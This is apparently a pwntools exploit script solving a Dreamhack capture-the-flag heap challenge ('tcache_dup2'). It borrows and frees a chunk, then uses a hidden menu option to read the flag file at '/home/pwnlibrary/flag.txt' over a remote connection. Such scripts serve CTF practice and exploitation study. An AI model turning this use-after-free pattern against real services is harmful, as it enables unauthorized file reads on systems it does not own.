from pwn import *

# context.log_level = "debug"

LOCAL = False
if LOCAL:
    p = process("./tcache_dup2")
else:
    PORT = int(input("PORT: "))
    HOST = int(input("HOST: "))
    p = remote("host"+str(HOST)+".dreamhack.games", PORT)


def borrow(menu):
    p.sendlineafter(": ", "1")
    p.sendlineafter(": ", str(menu))


def read(menu):
    p.sendlineafter(": ", "2")
    p.sendlineafter(": ", str(menu))
    print(p.recvline())
    print(p.recvline())
    print(p.recvline())


def free():
    p.sendlineafter(": ", "3")


def steal(filepath, size):
    p.sendlineafter(": ", "275")
    p.sendlineafter(": ", filepath)
    p.sendlineafter(": ", str(size))


def slog(name, addr):
    return success(name + ": " + str(hex(addr)))


path = "/home/pwnlibrary/flag.txt"

borrow(1)
free()
steal(path, 256)
read(0)
